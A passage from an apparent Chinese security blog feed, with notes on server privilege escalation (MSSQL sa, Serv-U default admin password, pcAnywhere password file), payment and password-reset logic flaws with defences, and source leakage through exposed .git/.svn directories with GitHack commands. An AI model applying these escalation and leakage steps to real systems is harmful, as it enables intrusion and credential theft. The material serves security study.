class="hljs-string">'cmd'</span>,<span class="hljs-string">'ipconfig'</span>);<br></code></pre></td></tr></table></figure></li></ul><hr><h3 id="直接外连提权"><a href="#直接外连提权" class="headerlink" title="直接外连提权"></a>直接外连提权</h3><p>MySQL开启对外连接，任意外网用户能够直接登陆，通过执行mysql语句进行提权<br>其原理就是udf提权，适用于windows和linux</p><hr><h2 id="MSSQL提权"><a href="#MSSQL提权" class="headerlink" title="MSSQL提权"></a>MSSQL提权</h2><h3 id="利用sa用户"><a href="#利用sa用户" class="headerlink" title="利用sa用户"></a>利用sa用户</h3><h4 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h4><p>所谓利用数据进行提权，即利用数据库的运行权限，因此需要满足以下条件：</p><ol><li>必须获得<code>sa</code>的账号密码或者<code>sa</code>相同权限的账号密码，且mssql没有被降权</li><li>必须可以以某种方式执行sql语句，如：webshell或者1433端口的连接</li></ol><p>PS:能够通过配置文件找到系统的登录账户密码</p><hr><h4 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h4><ol><li>MSSQL在Windows Server类操作系统上，默认具有system权限。system权限在windows server 2003中权限仅比管理员小，而在2003以上版本，则为最高权限</li><li>获取webshell之后可尝试在服务器各个站点目录寻找sa的密码（某些站点可直接在web应用程序中使用sa连接数据库），一般情况下，net的站点数据库连接字符串在<code>web.config</code>或者和<code>global.aspx</code>也有可能是编译在DLL文件当中</li><li>通过端口扫描查看1433（mssql默认端口）是否对外开放。若对外开放则使用sql连接器进行提权；若没有对外开放，则使用webshell自带的mssql数据库连接功能连接至mssql数据库</li><li><code>sa</code>作为mssql默认最高权限的账户，在正常情况下，可通过xp cmdshell等方式执行系统命令</li></ol><hr><h2 id="利用服务器的第三方组件提权"><a href="#利用服务器的第三方组件提权" class="headerlink" title="利用服务器的第三方组件提权"></a>利用服务器的第三方组件提权</h2><h3 id="Pcanywhere"><a href="#Pcanywhere" class="headerlink" title="Pcanywhere"></a>Pcanywhere</h3><p>赛门铁克公司出品的一款可远程连接到服务器的远程桌面工具</p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>pcanywhere与windows自带的mstsc（远程桌面）不同之处在于，pcanywhere不适用windows操作系统的用户密码进行盐哼，而是使用自身建立的用户密码进行验证<br>如此，只要获得pcanywhere的登陆密码，即可获取服务器的远程桌面</p><p>密码文件存储位置：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\pcanywherepwd<br></code></pre></td></tr></table></figure></p><hr><h3 id="Serv-U"><a href="#Serv-U" class="headerlink" title="Serv-U"></a>Serv-U</h3><p>Serv-U是使用Serv-u本地默认管理端口，以默认管理员登陆新建域和用户来执行命令<br>Serv-u &gt; 3.x版本默认配置：<br>本地管理端口：<code>43958</code><br>管理员：<code>LocalAdministrator</code><br>密码：<code>#|@$ak#.|k;0@P;</code><br>这是集成在Serv-u内部的，可以以<code>Guest</code>权限来进行连接，对其进行管理</p><p>通过连接Serv-U然后执行操作系统命令的方式来添加具有管理权限的账户<br>现在的Webshell很多都会自带Serv-U提权功能，只需输入要执行的命令即可</p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="总结一些经验"><a href="#总结一些经验" class="headerlink" title="总结一些经验"></a>总结一些经验</h3><p>拿到webshell</p><ul><li>win<br><code>whoami</code>判断权限，直接system就不用提权，jsp站直接system权限<br>systeminfo查看补丁信息和操作系统版本<br>上传exp，找可写目录<br>执行，若无法通过系统漏洞或系统服务漏洞提权，下一步翻目录<br>重点关注，config配置文件，比如数据库连接文件，pcanywhere的密码文件等等一些第三方软件的敏感文件<br>PS：一个服务器有<code>aspx</code>，<code>php</code>，<code>jsp</code>，拿下来一个aspx的低权限shell，翻目录发现jsp网站的目录，向jsp目录传一个webshell，然后访问jspshell，可能会有最高去权限</li></ul><hr><ul><li>linux<br>whoami判断权限，如果直接root权限就无需提权，在<code>weglogic</code>，<code>tomcat</code>，<code>jboss</code>等等一些jsp中间件出现比较多<br>查找系统版本<code>uname -a</code>，<code>cat /proc/version</code> 等等<br>接着去 <a href="http://www.exploit-db.com" target="_blank" rel="noopener">www.exploit-db.com</a> 查找对应内核版本的exp，上传<br>上传之后<code>gcc exp.c -o exp</code>若有需要需加编译参数，根据exp的注释说明来写。若服务器没有gcc，则在本地搭建一个同版本的系统，然后把exp在本地编译之后再上传<br>若exp无法提权，翻目录，linux敏感目录和文件有哪些（百度），比如：老版本linux的<code>/etc/passwd</code>存储了密码和账号，数据库配置文件等等</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Privilege </tag>
            
            <tag> Elevation </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>业务逻辑漏洞</title>
      <link href="/2019/01/28/Business-logic-hole/"/>
      <url>/2019/01/28/Business-logic-hole/</url>
      
        <content type="html"><![CDATA[<h2 id="权限绕过"><a href="#权限绕过" class="headerlink" title="权限绕过"></a>权限绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><blockquote><p>Web应用在接收某个请求执行特定的操作或者访问请求的资源时，要验证此请求是否由正确的用户发出。若此处验证操作存在缺陷，可能导致攻击者可以访问其他用户的敏感数据，甚至获得执行其它用户对应功能的权限。包括：交易支付、密码修改、密码找回、越权修改、越权查询、突破限制等各类逻辑漏洞</p></blockquote><p><strong>即：应用程序允许攻击者执行他没有资格执行的操作</strong></p><hr><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><h4 id="水平权限绕过"><a href="#水平权限绕过" class="headerlink" title="水平权限绕过"></a>水平权限绕过</h4><p>指允许用户控制相同类型下其他用户的资源，例如：一个普通用户可以修改其他同组用户的密码</p><h4 id="垂直权限绕过"><a href="#垂直权限绕过" class="headerlink" title="垂直权限绕过"></a>垂直权限绕过</h4><p>垂直权限绕过是指无权限或低权限的用户，可以控制有权限或高权限用户的资源。例如：普通用户可以使用管理员用户特有的功能，或者非会员时访问会员才能访问的资源</p><hr><h3 id="高危触发点"><a href="#高危触发点" class="headerlink" title="高危触发点"></a>高危触发点</h3><ul><li>密码修改、找回</li><li>订单处理</li><li>用户中心</li><li>资源下载</li></ul><hr><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><h4 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h4><ul><li>资源、敏感信息泄露</li></ul><h4 id="未授权操作"><a href="#未授权操作" class="headerlink" title="未授权操作"></a>未授权操作</h4><ul><li>资料修改</li><li>密码重置</li><li>修改支付信息</li><li>散播违规/违法信息</li></ul><hr><h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><h4 id="原则"><a href="#原则" class="headerlink" title="原则"></a>原则</h4><ul><li>不信任用户提交的关于访问权限的参数，应用程序应该只信任服务端完整信任链中的数据，任何用户传送至服务端的权限标识，都应该重新确认</li><li>仔细确认应用程序每个功能单元的权限需求，并进行严格的管理</li><li>对于关键业务逻辑（如：订单处理），应该对每次提出请求的相应权限进行冗余验证或者双重授权</li></ul><h4 id="Web逻辑层权限鉴定"><a href="#Web逻辑层权限鉴定" class="headerlink" title="Web逻辑层权限鉴定"></a>Web逻辑层权限鉴定</h4><p>通过session信息得到提交请求的操作者，通过数据库查询得到目标对象的权限所有者。判断两者是否一致，若不一致则阻断</p><h4 id="限控制转移到数据接口层"><a href="#限控制转移到数据接口层" class="headerlink" title="限控制转移到数据接口层"></a>限控制转移到数据接口层</h4><p>当进行数据操作时，在数据库接口就进行判断<br><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment"># 原语句</span><br><span class="hljs-keyword">SELECT</span> something <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> addressID = $addressID<br><br><span class="hljs-comment"># 修改后语句</span><br><span class="hljs-keyword">SELECT</span> something <span class="hljs-keyword">FROM</span> xxx <span class="hljs-keyword">WHERE</span> addressID = $addressID <span class="hljs-keyword">AND</span> ownerID = $userID<br></code></pre></td></tr></table></figure></p><h4 id="增加token校验"><a href="#增加token校验" class="headerlink" title="增加token校验"></a>增加token校验</h4><p>在生成表单时，增加一个<code>token</code>参数。<code>Token</code>可以使用与此次操作相关的参数生成，例如：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">token = md5(addressID + sessionID + key)<br></code></pre></td></tr></table></figure></p><p>在处理请求时，使用<code>addressID</code>、<code>sessionID</code>和<code>key</code>开检验<code>token</code>，以此判断请求的操作是否越权</p><hr><h2 id="支付逻辑漏洞"><a href="#支付逻辑漏洞" class="headerlink" title="支付逻辑漏洞"></a>支付逻辑漏洞</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>在一些交易网站上，开发者一般设计如下：<br>用户购买商品，然后根据价格，得到一个总价，随后根据总价来扣钱<br>但此逻辑若处理不当，则会出现许多问题例如：<br>若用户购买商品是负数，则计算的总计就是负数了，这样系统的处理反而会给用户钱</p><hr><h4 id="一般支付流程"><a href="#一般支付流程" class="headerlink" title="一般支付流程"></a>一般支付流程</h4><ol><li>挑选商品加入购物车</li><li>确认购物车信息</li><li>输入物流及收货人信息</li><li>确认订单进入支付环节</li><li>交易成功等待发货</li></ol><p>又例如：<br>某网站流程为<code>A==&gt;B==&gt;C==&gt;D</code>，开发者意图为必须顺序执行，也认为用户会按照预定顺序执行每一步，这是因为在浏览器中导航是如此处理的<br>但此开发者的假设是存在缺陷的，用户若控制着他们给应用程序发送的每一个请求，因此能够按照任何顺序进行访问。于是如C是支付过程或验证过程，用户直接跳过C过程，买到了商品或绕过了验证</p><hr><h3 id="常见种类"><a href="#常见种类" class="headerlink" title="常见种类"></a>常见种类</h3><h4 id="金额直接传输导致篡改"><a href="#金额直接传输导致篡改" class="headerlink" title="金额直接传输导致篡改"></a>金额直接传输导致篡改</h4><p>抓包改包，即可改变传输的金额</p><h4 id="确认支付后仍可加入购物车"><a href="#确认支付后仍可加入购物车" class="headerlink" title="确认支付后仍可加入购物车"></a>确认支付后仍可加入购物车</h4><p>攻击者在将商品加入购物车点击支付后，支付会转向一个第三方支付。此时攻击者还能往购物车内加入商品，当支付完成后，商家发放的商品是现有购物车里的东西</p><h4 id="请求重放"><a href="#请求重放" class="headerlink" title="请求重放"></a>请求重放</h4><p>购买成功后，重放其中请求，可以使购买的商品一直增加。购买成功后，会有一个从银行向商户网站跳转的过程，若此过程反复重放，可能会导致商品的反复购买和增加，但用户不用支付更多的货币</p><h4 id="订单替换"><a href="#订单替换" class="headerlink" title="订单替换"></a>订单替换</h4><p>订单替换的攻击方式发生在支付之后的事件处理，攻击者同时向服务器发起两次支付，请求一个多的和一个少的，支付金钱数目少的，支付完成后，替换支付的订单，告诉服务器此订单支付完成，并且此过程可反复回放，因为在服务器端保存的订单状态即使逻辑上处理检查过是否发放商品</p><h4 id="单位替换"><a href="#单位替换" class="headerlink" title="单位替换"></a>单位替换</h4><p>此过程产生在paypal类似国际支付的场景</p><h4 id="强制攻击"><a href="#强制攻击" class="headerlink" title="强制攻击"></a>强制攻击</h4><p>强制攻击发生在暴力破解的情况下，若一个商家运用一个自己的网站，接入第三方支付接口，由于涉及上的不当，导致商家与第三方支付约定的密钥key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息，使得MD5加密是可以用MD5碰撞技术进行暴力破解</p><p>防范：经常更换密钥。由于商家不是开发者，对于密钥没有深刻的理解，甚至可能随意泄露了自己的密钥信息，以及在功能正常的情况下不对密钥进行更改</p><h4 id="密钥泄露"><a href="#密钥泄露" class="headerlink" title="密钥泄露"></a>密钥泄露</h4><p>内置支付功能的app为了设计上的方便可能会把MD5或者RSA的私钥泄露，导致攻击者反编译apk之后，获取密钥信息，使得交易信息可以被篡改</p><h4 id="函数修改"><a href="#函数修改" class="headerlink" title="函数修改"></a>函数修改</h4><p>apk反编译之后的函数修改，有可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，虽然此时以对信息进行签名，但是仍然被篡改</p><hr><h3 id="防范"><a href="#防范" class="headerlink" title="防范"></a>防范</h3><h4 id="支付流程注意事项"><a href="#支付流程注意事项" class="headerlink" title="支付流程注意事项"></a>支付流程注意事项</h4><table><thead><tr><th><strong>支付前</strong></th><th><strong>支付中</strong></th><th><strong>支付后</strong></th></tr></thead><tbody><tr><td>1.检查支付金额边界值</td><td>漏洞一般很少出现</td><td>1.检测签名是否正确</td></tr><tr><td>2.检查支付数量边界值</td><td>因为由银行或者是第三方管理</td><td>2.检测订单号是否正确</td></tr><tr><td>3.金额不要直接传输</td><td>目前可以利用的有SSL以及根证书欺骗问题</td><td>3.检测订单号对应的金额是否正确</td></tr><tr><td>4.使用订单号的方式传输订单</td><td></td><td>4.检测订单号对应的金额是否正确</td></tr><tr><td>5.对所有的购买信息进行签名</td><td></td><td>5.检测订单号对应的产品是否正确</td></tr><tr><td>6.经常更换签名密钥</td><td></td><td>6.检测收款人是否正确</td></tr></tbody></table><hr><h4 id="检测模型"><a href="#检测模型" class="headerlink" title="检测模型"></a>检测模型</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 订单号</span><br>Order/OrderId/Order_id/out_trade_no/tradeNo/*trade*/*order*/payno*/payment_id/paymentId/merc_tranid/*tranid*<br><span class="hljs-comment"># 价格</span><br>*Price*/*total_fee*/*amount*/*amt*<br><br><span class="hljs-comment"># 数量</span><br>*Number*/*quantity*<br><br><span class="hljs-comment"># 物品ID</span><br>itemId/Item_id<br><br><span class="hljs-comment"># 用户</span><br>User/usr<br><br><span class="hljs-comment"># 通知地址</span><br>Notifyurl/notify_url/return_url/returnurl/show_url/showurl<br><br><span class="hljs-comment"># 商户</span><br>Default_partner/*partner*<br><br><span class="hljs-comment"># 签名方式</span><br>Sign_type/signtype<br><br><span class="hljs-comment"># 密钥</span><br>PRIVATE/private_key/*MD5*/*key*<br><br><span class="hljs-comment"># 签名</span><br>Sign/*verity_sign*/*auth*<br></code></pre></td></tr></table></figure><hr><h2 id="密码找回漏洞挖掘"><a href="#密码找回漏洞挖掘" class="headerlink" title="密码找回漏洞挖掘"></a>密码找回漏洞挖掘</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h4><ul><li><p>需要旧密码</p><blockquote><ul><li>验证不输入旧密码可否修改，或尝试抓包将提交旧密码参数删除</li><li>验证旧密码输入处是否存在sql注入</li><li>验证是否可跳过输入旧密码步骤直接修改新密码</li></ul></blockquote></li><li><p>不需要旧密码</p><blockquote><ul><li>验证修改密码提交数据中是否包含了用户身份信息</li><li>验证提交的用户身份信息被修改后是否可以成功修改</li><li>验证修改Cookies中的每一项包含用户身份的信息是否会影响修改结果</li><li>验证是否可以在不登陆的情况下直接提交修改密码的请求进行修改</li><li>验证是否可以越权修改任意用户密码</li></ul></blockquote></li></ul><hr><h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><ol><li>走一遍正常密码修改流程，把过程中所有环节的数据包全部保存</li><li>分析流程中哪些步骤使用了哪些身份认证信息，使用了哪些认证方法</li><li>分析哪个步骤可以跳过，或可以直接访问某个步骤</li><li>分析每个认证方法是否存在缺陷，可否越权</li><li>首先尝试正常密码找回流程，选择不同找回方式，如：邮箱、手机、密码提示问题等</li><li>分析各种找回机制所采用的验证手段，如：验证码有效期、有效次数、生成规律、是否与用户信息关联等</li><li>抓取修改密码步骤的所有数据包，尝试修改关键信息，如：用户名、用户ID、邮箱地址、手机号等</li></ol><hr><h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><p><strong>原则</strong><br>密码找回漏洞本质仍然属于权限漏洞的一种，所以需要遵守权限绕过的防御规则</p><ul><li>不信任用户提交的关于访问权限的参数，应用程序应该只信任服务端完整信任链中的数据，任何用户传送至服务端的权限标识，都应重新确认</li><li>在进行密码修改逻辑的过程中，应对每次提交请求的相应权限进行冗余验证或者双重验证</li></ul><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><h3 id="Google-Hacking基本语法"><a href="#Google-Hacking基本语法" class="headerlink" title="Google Hacking基本语法"></a>Google Hacking基本语法</h3><p><code>Site</code>      指定域名<br><code>Intext</code>     正文中存在关键字的网页<br><code>Intitle</code>     标题中存在关键字的网页<br><code>Info</code>     一些基本信息<br><code>Inurl</code>     URL存在关键字的网页<br><code>Filetype</code>   搜索指定文件类型    </p>]]></content>
      
      
      
        <tags>
            
            <tag> Business </tag>
            
            <tag> Logic </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>信息泄露漏洞</title>
      <link href="/2019/01/26/Information-leakage/"/>
      <url>/2019/01/26/Information-leakage/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞定义"><a href="#漏洞定义" class="headerlink" title="漏洞定义"></a>漏洞定义</h2><p>常见为配置文件存放不当，导致Web系统备份、数据库备份、用户数据文件等暴露在Web系统上，引发信息泄露<br>泄露的系统信息或者调试信息可以帮助攻击者了解系统和制定攻击计划。信息泄露一般发生在程序使用输出或者日志功能的时候。</p><h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><code>index</code>文件是Web应用程序的默认入口文件，被称为索引文件。访问Web应用程序时若未指定某个文件，Web应用程序就会调用索引文件。根据Web开发脚本语言的不同，索引文件往往也不同<br>常见有：<br><code>index.html</code>、<code>index.jsp</code>、<code>index.asp</code>等<br>下面两个URL访问效果相同：</p><ul><li><a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a></li><li><a href="https://www.baidu.com/index.html" target="_blank" rel="noopener">https://www.baidu.com/index.html</a></li></ul><p>目录遍历是指当前目录无<code>index.html</code>、<code>index.asp</code>、<code>index.php</code>、<code>index.jsp</code>等索引文件的情况下，若Web中间件配置不当，访问该目录时会直接显示该目录下所有文件及其子目录</p><p>例如：<br>在<code>phpStudy</code>中，在<br><code>其它选项菜单==&gt;软件设置==&gt;允许目录列表文件</code><br>配置文件中，使显示改变加减号<br><code>httpd.conf</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;Directory /&gt;<br>    Opetions - Indexes + FollowSymLinks + ExecCGI<br>    AllowOverride AllowOverride<br>    Order allow,deny<br>    Allow from allow<br>    Require all granted<br>&lt;/Directory&gt;<br></code></pre></td></tr></table></figure></p><p><strong>TIP:</strong><br>新版Apache应去掉或不去掉使之显示或不显示<br>若phpStudy选择允许目录显示，则中间件配置文件不影响其显示与否</p><hr><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul><li>泄露网站后台路径</li><li>泄露网站敏感的文件信息</li><li>泄露网站的编辑器路径</li><li>泄露网站的测试接口<br>etc..</li></ul><p><strong>TIP:</strong><br>浏览器不能解析的文件，访问操作均会变成下载</p><hr><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>若发现Web应用程序存在目录遍历漏洞，则可查找到该网站的后台地址、备份文件等敏感信息。结合搜集的敏感信息，则可进行下一步渗透，如：爆破管理员密码、分析网站源码等</p><hr><h2 id="管理后台对外漏洞"><a href="#管理后台对外漏洞" class="headerlink" title="管理后台对外漏洞"></a>管理后台对外漏洞</h2><p>Web系统后台管理界面对外网开放</p><h3 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h3><h4 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h4><p>如Web系统后台无验证码或存在缺陷的验证代码，攻击者可通过密码“字典”来对管理员账户进行暴力破解，若管理员密码复杂度较低，就存在密码被破解的风险</p><h4 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h4><p>攻击者通过收集第三方泄露的用户账号信息和密码，进行尝试登陆。若管理员密码使用了与第三方相同的密码并未及时修改，管理员账号就有被入侵的风险</p><h4 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h4><p>管理后台对外开放，潜在增加了注入攻击的风险。管理后台登陆界面若对用户名面膜过滤不严谨，则可能存在注入风险</p><hr><h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2><h3 id="hg源码泄露"><a href="#hg源码泄露" class="headerlink" title="hg源码泄露"></a>hg源码泄露</h3><p><code>hg</code> init 时会产生<code>.hg</code>文件<br>利用工具：<code>dvcs-ripper</code></p><h3 id="Git源码泄露"><a href="#Git源码泄露" class="headerlink" title="Git源码泄露"></a>Git源码泄露</h3><h4 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h4><p><code>.git</code>目录内有代码的变更记录等文件，若部署时该目录下的文件可被访问，可能会被利用来恢复源代码<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">/.git<br>/.git/HEAD<br>/.git/index<br>/.git/config<br>/.git/description<br></code></pre></td></tr></table></figure></p><hr><h4 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h4><p><code>GitHack</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GitaHack.py http://www.openssl.org/.git/<br></code></pre></td></tr></table></figure></p><p><code>GitHacker（可恢复完整Git仓库）</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python GitHacker.py http://www.openssl.org/.git/<br></code></pre></td></tr></table></figure></p><p><strong><code>.DS_Store文件泄露</code></strong></p><h3 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h3><h4 id="敏感文件-1"><a href="#敏感文件-1" class="headerlink" title="敏感文件"></a>敏感文件</h4><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/.svn<br>/.svn/wc.db<br>/.svn/entries<br></code></pre></td></tr></table></figure><h4 id="利用工具-1"><a href="#利用工具-1" class="headerlink" title="利用工具"></a>利用工具</h4><p><code>dvcs-ripper</code><br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl rip-svn.pl -v -u http://www.example.com/.svn/<br></code></pre></td></tr></table></figure></p><p><code>Seay - SVN</code></p><hr><h3 id="WEB-INF-web-xml泄露"><a href="#WEB-INF-web-xml泄露" class="headerlink" title="WEB-INF/web.xml泄露"></a>WEB-INF/web.xml泄露</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>WEB-INF是<code>Java Web</code>应用的安全目录，<code>web.xml</code>中有文件的映射关系<br>WEB-INF主要包含以下文件或目录：</p><ul><li><code>/WEB-INF/web.xml</code>：Web应用程序配置文件，描述了<code>servlet</code>和其它的应用组件配置及命名规则</li><li><code>WEB-INF/classes/</code>：包含了站点所有用到的<code>class</code>文件，包括<code>servlet class</code>和非<code>servlet class</code>，它们不能包含在<code>.jar</code>文件中</li><li><code>/WEB-INF/lib/</code>：存放Web应用需要的各种<code>JAR</code>文件，放置仅在这个应用中要求使用的<code>jar</code>文件，例如数据库驱动<code>jar</code>文件</li><li><code>/WEB-INF/src/</code>：源码目录，按照包名结构放置各个Java文件</li><li><code>/WEB-INF/database.properties</code>：数据库配置文件</li></ul><p>通过找到<code>web.xml</code>文件，推断class文件的路径，最后直接通过class文件反编译，得到网站源码。一般情况下，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，<code>Nginx</code>不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（如此耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录即可：<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">location ~ ^/WEB-INF/*&#123;deny all;&#125; <span class="hljs-comment"># 或者return 404;或者其它</span><br></code></pre></td></tr></table></figure></p><hr><h3 id="CVS泄露"><a href="#CVS泄露" class="headerlink" title="CVS泄露"></a>CVS泄露</h3><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://url/CVS/Root  <span class="hljs-comment"># 返回根信息</span><br>http://url/CVS/Entries  <span class="hljs-comment"># 返回所有文件的结构</span><br></code></pre></td></tr></table></figure><p>取回源码<br><figure class="hljs highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bk <span class="hljs-built_in">clone</span> http://url/name dir<br></code></pre></td></tr></table></figure></p><hr><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><code>CVS</code>、<code>SVN</code>用于版本控制</p><p>反单引号等同于<code>exec</code><br>例如：<br><figure class="hljs highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> `whoami`;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> Information </tag>
            
            <tag> Leakage </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>非常规注入</title>
      <link href="/2019/01/24/Unconventional-Injection/"/>
      <url>/2019/01/24/Unconventional-Injection/</url>
      
        <content type="html"><![CDATA[<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><blockquote><p>XML(The Extensible Markup Language)可扩展标识语言。最初目的是弥补HTML的不足，后逐渐用于网络数据的转换和描述。其设计宗旨是传输数据，而不是显示数据。XML在web中的应用已十分广泛，是各种应用程序之间数据传输最常用的工具</p></blockquote><h3 id="与HTML的区别"><a href="#与HTML的区别" class="headerlink" title="与HTML的区别"></a>与HTML的区别</h3><ul><li>HTML被设计于用来展示数据</li><li>XML被设计于用来传输数据</li></ul><hr><h3 id="XML实体（ENTITY）"><a href="#XML实体（ENTITY）" class="headerlink" title="XML实体（ENTITY）"></a>XML实体（ENTITY）</h3><p>在一个甚至多个XML文档中频繁使用某一条数据，则可以预先定义一个这条数据的<code>别名</code>，即<code>ENTITY</code>，然后在这些文档中需要该数据的地方调用它</p><h3 id="实体类型"><a href="#实体类型" class="headerlink" title="实体类型"></a>实体类型</h3><p>普通实体、外部实体、参数实体、外部参数实体</p><hr><h4 id="内部实体和外部实体"><a href="#内部实体和外部实体" class="headerlink" title="内部实体和外部实体"></a>内部实体和外部实体</h4><p>根据实体的来源，，可以分为<code>内部实体</code>和<code>外部实体</code>。<br>XML定义了两种类型的ENTITY：</p><ul><li>XML文档中使用的ENTITY</li><li>作为参数在<code>DTD</code>文件中使用的ENTITY<br>定义好的ENTITY在文档中通过<code>&amp;实体名;</code>来使用</li></ul><p>TIP:可以把实体当作XML语言的变量</p><hr><h4 id="普通实体和参数实体"><a href="#普通实体和参数实体" class="headerlink" title="普通实体和参数实体"></a>普通实体和参数实体</h4><p>其又可分为普通实体和参数实体</p><table><thead><tr><th><strong>类型</strong></th><th><strong>普通实体</strong></th><th><strong>参数实体</strong></th></tr></thead><tbody><tr><td>使用场合</td><td>XML文档中</td><td>只用于DTD中元素和属性的声明中</td></tr><tr><td>内部声明</td><td><code>&lt;!ENTITY 实体名 &quot;文本内容&quot;&gt;</code></td><td><code>&lt;!ENTITY % 实体名 &quot;文本内容&quot;&gt;</code></td></tr><tr><td>外部声明</td><td><code>&lt;!ENTITY 实体名 SYSTEM &quot;外部文件URL地址&quot;&gt;</code></td><td><code>&lt;!ENEITY % 实体名 SYSTEM &quot;外部文件URL地址&quot;&gt;</code></td></tr><tr><td>引用方式</td><td><code>&amp;实体名;</code></td><td><code>%实体名;</code></td></tr></tbody></table><hr><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><h4 id="定义"><a href="#定义" class="headerlink" 